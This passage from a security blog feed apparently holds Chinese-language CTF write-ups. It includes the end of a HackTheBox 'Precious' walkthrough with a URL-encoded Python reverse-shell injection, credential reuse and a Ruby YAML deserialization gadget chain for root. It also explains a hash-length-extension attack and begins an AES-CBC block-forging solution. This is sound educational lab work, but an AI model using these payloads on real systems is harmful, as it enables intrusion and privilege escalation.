class="string">&quot;url=http%3A//10.10.*.*/%3Fname%3D%2520%60python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2710.10.*.*%27%2C9998%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27/bin/bash%27%2C%27-i%27%5D%29%3B%22%60&quot;</span></span><br></pre></td></tr></table></figure><p>获取tty</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/ruby/.bundle/config</span><br></pre></td></tr></table></figure><p>得到用户henry的账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">BUNDLE_HTTPS:&#x2F;&#x2F;RUBYGEMS__ORG&#x2F;: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot;</span><br></pre></td></tr></table></figure><p>SSH登入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh henry@10.10.11.189</span><br><span class="line">Q3c1AqGHtoI0aXAYFH</span><br></pre></td></tr></table></figure><p>查看flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /home/henry/user.txt </span><br><span class="line">c2495bbeca89a6c2caaabb23a05934a9</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for henry on precious:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User henry may run the following commands on precious:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;ruby &#x2F;opt&#x2F;update_dependencies.rb</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat update_dependencies.rb</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Compare installed dependencies with those specified in &quot;dependencies.yml&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;yaml&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;rubygems&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> update versions automatically</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_gems</span><span class="params">()</span></span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_from_file</span></span></span><br><span class="line">    YAML.load(File.read(<span class="string">&quot;dependencies.yml&quot;</span>))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_local_gems</span></span></span><br><span class="line">    Gem::Specification.sort_by&#123; <span class="params">|g|</span> [g.name.downcase, g.version] &#125;.map&#123;<span class="params">|g|</span> [g.name, g.version.to_s]&#125;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">gems_file = list_from_file</span><br><span class="line">gems_local = list_local_gems</span><br><span class="line"></span><br><span class="line">gems_file.each <span class="keyword">do</span> <span class="params">|file_name, file_version|</span></span><br><span class="line">    gems_local.each <span class="keyword">do</span> <span class="params">|local_name, local_version|</span></span><br><span class="line">        <span class="keyword">if</span>(file_name == local_name)</span><br><span class="line">            <span class="keyword">if</span>(file_version != local_version)</span><br><span class="line">                puts <span class="string">&quot;Installed version differs from the one specified in file: &quot;</span> + local_name</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                puts <span class="string">&quot;Installed version is equals to the one specified in file: &quot;</span> + local_name</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>YAML.load()存在反序列化漏洞</p><blockquote><p><a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/">https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/</a></p></blockquote><p>构造能够利用漏洞的yml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp; vi /tmp/dependencies.yml</span><br></pre></td></tr></table></figure><p>文件内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!ruby/object:Gem::Installer</span></span><br><span class="line">    <span class="attr">i:</span> <span class="string">x</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!ruby/object:Gem::SpecFetcher</span></span><br><span class="line">    <span class="attr">i:</span> <span class="string">y</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!ruby/object:Gem::Requirement</span></span><br><span class="line">  <span class="attr">requirements:</span></span><br><span class="line">    <span class="type">!ruby/object:Gem::Package::TarReader</span></span><br><span class="line">    <span class="attr">io:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Net::BufferedIO</span></span><br><span class="line">      <span class="attr">io:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Gem::Package::TarReader::Entry</span></span><br><span class="line">         <span class="attr">read:</span> <span class="number">0</span></span><br><span class="line">         <span class="attr">header:</span> <span class="string">&quot;abc&quot;</span></span><br><span class="line">      <span class="attr">debug_output:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Net::WriteAdapter</span></span><br><span class="line">         <span class="attr">socket:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Gem::RequestSet</span></span><br><span class="line">             <span class="attr">sets:</span> <span class="type">!ruby/object:Net::WriteAdapter</span></span><br><span class="line">                 <span class="attr">socket:</span> <span class="type">!ruby/module</span> <span class="string">&#x27;Kernel&#x27;</span></span><br><span class="line">                 <span class="attr">method_id:</span> <span class="string">:system</span></span><br><span class="line">             <span class="attr">git_set:</span> <span class="string">&quot;python3 -c \&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.*.*&#x27;,9997));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);\&quot;&quot;</span></span><br><span class="line">         <span class="attr">method_id:</span> <span class="string">:resolve</span></span><br></pre></td></tr></table></figure><p>监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9997</span><br></pre></td></tr></table></figure><p>触发反序列化漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/ruby /opt/update_dependencies.rb</span><br></pre></td></tr></table></figure><p>获得root权限，查看flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br><span class="line">a6c3884ed3b917b870834758ab46f9f1</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="WrtiteUp" scheme="https://yoloyolo.top/categories/WrtiteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hash_Extend</title>
    <link href="https://yoloyolo.top/2023/02/21/Hash-Extend/"/>
    <id>https://yoloyolo.top/2023/02/21/Hash-Extend/</id>
    <published>2023-02-21T11:21:17.000Z</published>
    <updated>2023-02-21T12:06:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><blockquote><p>pip install hashpumpy</p></blockquote><p>MD5, SHA1, SHA256每轮加密块大小为64Byte(512Bits)，其中前56Byte(448Bits)用于存储加密数据，后8Byte(64Bits)用于存储数据Bit位数</p><p>SHA512每轮加密块大小为128Byte(1024Bits)，其中前112Byte(896Bits)用于存储加密数据，后16Byte(128Bits)用于存储数据Bit位数</p><p>MD5存储数据长度时使用小端排序，SHA1, SHA256, SHA512则使用大端排序</p><p>SHA384在使用hashpumpy.pump时会报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpumpy.error: unsupported hash size</span><br></pre></td></tr></table></figure><p>以上Hash算法均基于Merkle-Damgård结构，抽象来看，可以类比于对称加密中的OFB模式，即上一轮的加密结果会作为下一轮加密的输入</p><p>以MD5为例</p><p>我们要加密明文admin，此时明文长度小于加密块数据长度，则会被填充<code>\x80\x00\x00\x00...</code></p><p>那么加密块为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure><p>在完成第一轮加密之后我们会得到这一部分的Hash值，如有后续部分，则这部分Hash将作为输入对后一轮加密进行处理</p><p>假设存在一个认证方式，将以下内容作为Cookie<br />username+signature<br />且signature=MD5(secret+username)<br />且在校验方法为<br />MD5(secret+input_username) == signature</p><p>我们以Alice身份登入后得到这个Cookie，即<br />MD5(secret+“Alice”)</p><p>如果secret长度已知，假设为6</p><p>那么可以得到以下加密块，以及其MD5值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">??????Alice\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure><p>在加密块后续内容追加内容Bob，则可以将上一部分的MD5作为下一轮加密的输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">??????Alice\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00Bob</span><br></pre></td></tr></table></figure><p>即可得到这部分的MD5值</p><p>在进行认证时，可以使用以下用户名以及其相应的MD5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&quot;Alice\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00Bob&quot;</span><br></pre></td></tr></table></figure><p>服务器在验证身份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5(secert+&quot;Alice\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00Bob&quot;) &#x3D;&#x3D; signature</span><br></pre></td></tr></table></figure><p>即完成了哈希扩展攻击，如果服务器对用户名的验证存在不安全的逻辑，那么就有可能越权漏洞</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Crypto" scheme="https://yoloyolo.top/tags/Crypto/"/>
    
    <category term="Hash" scheme="https://yoloyolo.top/tags/Hash/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Flippin_Bank</title>
    <link href="https://yoloyolo.top/2023/02/20/HackTheBox-Flippin-Bank/"/>
    <id>https://yoloyolo.top/2023/02/20/HackTheBox-Flippin-Bank/</id>
    <published>2023-02-20T10:33:53.000Z</published>
    <updated>2023-02-20T10:47:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>Dramatically solved.</p><a id="more"></a><h1 id="hackthebox_flippin_bank"><a class="markdownIt-Anchor" href="#hackthebox_flippin_bank"></a> HackTheBox_Flippin_Bank</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socketserver </span><br><span class="line"><span class="keyword">import</span> socket, os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad,unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wlcm_msg =<span class="string">&#x27;########################################################################\n&#x27;</span>+\</span><br><span class="line">          <span class="string">&#x27;#                  Welcome to the Bank of the World                    #\n&#x27;</span>+\</span><br><span class="line">          <span class="string">&#x27;#             All connections are monitored and recorded               #\n&#x27;</span>+\</span><br><span class="line">          <span class="string">&#x27;#      Disconnect IMMEDIATELY if you are not an authorized user!       #\n&#x27;</span>+\</span><br><span class="line">          <span class="string">&#x27;########################################################################\n&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = get_random_bytes(<span class="number">16</span>)</span><br><span class="line">iv = get_random_bytes(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_data</span>(<span class="params">data</span>):</span></span><br><span class="line">    padded = pad(data.encode(),<span class="number">16</span>,style=<span class="string">&#x27;pkcs7&#x27;</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC,iv)</span><br><span class="line">    enc = cipher.encrypt(padded)</span><br><span class="line">    <span class="keyword">return</span> enc.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_data</span>(<span class="params">encryptedParams</span>):</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC,iv)</span><br><span class="line">    paddedParams = cipher.decrypt( unhexlify(encryptedParams))</span><br><span class="line">    print(paddedParams)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;admin&amp;password=g0ld3n_b0y&#x27;</span> <span class="keyword">in</span> unpad(paddedParams,<span class="number">16</span>,style=<span class="string">&#x27;pkcs7&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">s, msg</span>):</span></span><br><span class="line">    enc = msg.encode()</span><br><span class="line">    s.send(enc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">s</span>):</span></span><br><span class="line">    send_msg(s, <span class="string">&#x27;username: &#x27;</span>)</span><br><span class="line">    user = s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line"></span><br><span class="line">    send_msg(s, user +<span class="string">&quot;&#x27;s password: &quot;</span> )</span><br><span class="line">    passwd = s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">    </span><br><span class="line">    send_msg(s, wlcm_msg)</span><br><span class="line"></span><br><span class="line">    msg = <span class="string">&#x27;logged_username=&#x27;</span> + user +<span class="string">&#x27;&amp;password=&#x27;</span> + passwd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span>(<span class="string">&#x27;admin&amp;password=g0ld3n_b0y&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> msg)</span><br><span class="line">    <span class="keyword">except</span> AssertionError:</span><br><span class="line">        send_msg(s, <span class="string">&#x27;You cannot login as an admin from an external IP.\nYour activity has been logged. Goodbye!\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">    msg = <span class="string">&#x27;logged_username=&#x27;</span> + user +<span class="string">&#x27;&amp;password=&#x27;</span> + passwd</span><br><span class="line">    send_msg(s, <span class="string">&quot;Leaked ciphertext: &quot;</span> + encrypt_data(msg)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    send_msg(s,<span class="string">&quot;enter ciphertext: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    enc_msg = s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        check = decrypt_data(enc_msg)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        send_msg(s, <span class="built_in">str</span>(e) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> check:</span><br><span class="line">        send_msg(s, <span class="string">&#x27;Logged in successfully!\nYour flag is: &#x27;</span>+ FLAG)</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        send_msg(s, <span class="string">&#x27;Please try again.&#x27;</span>)</span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskHandler</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        main(self.request)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    socketserver.ThreadingTCPServer.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server = socketserver.ThreadingTCPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1337</span>), TaskHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><h2 id="cbc字节翻转"><a class="markdownIt-Anchor" href="#cbc字节翻转"></a> CBC字节翻转？</h2><p>一眼CBC字节翻转</p><p>看一半发现IV不可控</p><h2 id="cbc密码块构造"><a class="markdownIt-Anchor" href="#cbc密码块构造"></a> CBC密码块构造</h2><p>想了一下可以构造伪密码块</p><p>CBC大概加解密流程如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plain_Block -&gt; Xor(Last_Cipher_Block&#x2F;IV) -&gt; Block Cipher Encrypt -&gt; Cipher_Block -&gt; Xor(Last_Cipher_Block&#x2F;IV) -&gt; Plain_Block</span><br></pre></td></tr></table></figure><p>题目中的所需密码块如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    Plain_Block_0       Plain_Block_1       Plain_Block_2</span><br><span class="line">    logged_username&#x3D;    admin&amp;password&#x3D;g    0ld3n_b0y</span><br><span class="line">IV  Cipher_Block_0      Cipher_Block_1      Cipher_Block_2</span><br></pre></td></tr></table></figure><p><code>Key</code>, <code>IV</code>, <code>Plain_Block_0</code>固定，则<code>Cipher_Block_0</code>固定</p><p>攻击思路如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target = Plain_Block_1 ^ Cipher_Block_0</span><br><span class="line">Cipher_Block_1 = encrypt(target)</span><br><span class="line">Cipher_Block_2 = encrypt(Plain_Block_2 ^ Cipher_Block_1)</span><br></pre></td></tr></table></figure><p>我们可以在<code>Plain_Block_1</code>与<code>Plain_Block_2</code>中间插入<code>Plain_Block_Payload</code><br />并且满足以下条件</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cipher_Block_Payload = encrypt(Plain_Block_Payload ^ Cipher_Block_1)</span><br><span class="line">Cipher_Block_Payload == Cipher_Block_1</span><br></pre></td></tr></table></figure><p>在这种情况下则有</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher_Block_Payload == Cipher_Block_1</span><br><span class="line">Cipher_Block_Payload ^ Plain_Block_2 == Cipher_Block_1 ^ Plain_Block_2</span><br><span class="line">encrypt(Cipher_Block_Payload ^ Plain_Block_2) == encrypt(Cipher_Block_1 ^ Plain_Block_2) == Cipher_Block_2</span><br></pre></td></tr></table></figure><p>即我们可以获得Get Flag情况下<code>Cipher_Block_2</code>的内容</p><p>但是<code>Plain_Block_Payload</code>该如何构造？</p><h2 id="payload明文密码块构造"><a class="markdownIt-Anchor" href="#payload明文密码块构造"></a> Payload明文密码块构造</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cipher_Block_Payload == Cipher_Block_1</span><br><span class="line">encrypt(Plain_Block_Payload ^ Cipher_Block_1) == encrypt(Plain_Block_1 ^ Cipher_Block_0)</span><br><span class="line">Plain_Block_Payload ^ Cipher_Block_1 == Plain_Block_1 ^ Cipher_Block_0</span><br><span class="line">Plain_Block_Payload == Plain_Block_1 ^ Cipher_Block_0 ^ Cipher_Block_1</span><br></pre></td></tr></table></figure><p>所需的三个条件已知，所以我们可以很轻松的得到<code>Plain_Block_Payload</code></p><h2 id="encode-decode"><a class="markdownIt-Anchor" href="#encode-decode"></a> Encode &amp; Decode</h2><p>将构造的内容用pwntools发出后没有收到响应</p><p>多次调试后发现问题所在</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">send_msg(s, user +<span class="string">&quot;&#x27;s password: &quot;</span> )</span><br><span class="line">passwd = s.recv(<span class="number">4096</span>).decode().strip()</span><br></pre></td></tr></table></figure><p>本地生成算出Payload Hex形式后转字符串是用<code>ISO-8859-1</code>编码，这个单字节编码在处理<code>\x7a</code>以上的字符时很好用，所以顺手就用这个编码去处理Payload了</p><p>但是问题随之而来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0xa6 in position 15: invalid start byte</span><br></pre></td></tr></table></figure><p>也就是意味着我的Payload需要能够被UTF-8编码处理</p><p>WTF?</p><h2 id="guessing-game"><a class="markdownIt-Anchor" href="#guessing-game"></a> Guessing Game</h2><p>所以现在所能做的，就只有去修改<code>Plain_Block_1</code>的内容</p><p><code>Plain_Block_1</code>内容如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?????&amp;password&#x3D;?</span><br></pre></td></tr></table></figure><p>爆破六位掩码，这会影响<code>Cipher_Block_1</code>的结果</p><p>由于AES加密过程的扩散性，我们可以将<code>Cipher_Block_1</code>的结果看成是随机的</p><p>我们所需要的结果是<code>Payload_Block_Payload</code>的16字节均小于<code>\x80</code>，这样UTF-8编码就能处理</p><p>概率为1/65536，但值得一试</p><p>我们再理一遍思路</p><p>原始密码块如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    Plain_Block_0       Plain_Block_1       Plain_Block_2</span><br><span class="line">    logged_username&#x3D;    admin&amp;password&#x3D;g    0ld3n_b0y</span><br><span class="line">IV  Cipher_Block_0      Cipher_Block_1      Cipher_Block_2</span><br></pre></td></tr></table></figure><p>我们需要的XOR结果如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target = Cipher_Block_0 ^ Plain_Block_1</span><br></pre></td></tr></table></figure><p>现在我们开始爆破<code>Plain_Block_1</code>，可以得到<code>Tmp_Cipher_Block_1</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    Plain_Block_0       Tmp_Plain_Block_1   Tmp_Plain_Block_Payload     Plain_Block_2</span><br><span class="line">    logged_username&#x3D;    ?????&amp;password&#x3D;?    ????????????????            0ld3n_b0y</span><br><span class="line">IV  Cipher_Block_0      Tmp_Cipher_Block_1  Tmp_Cipher_Block_Payload    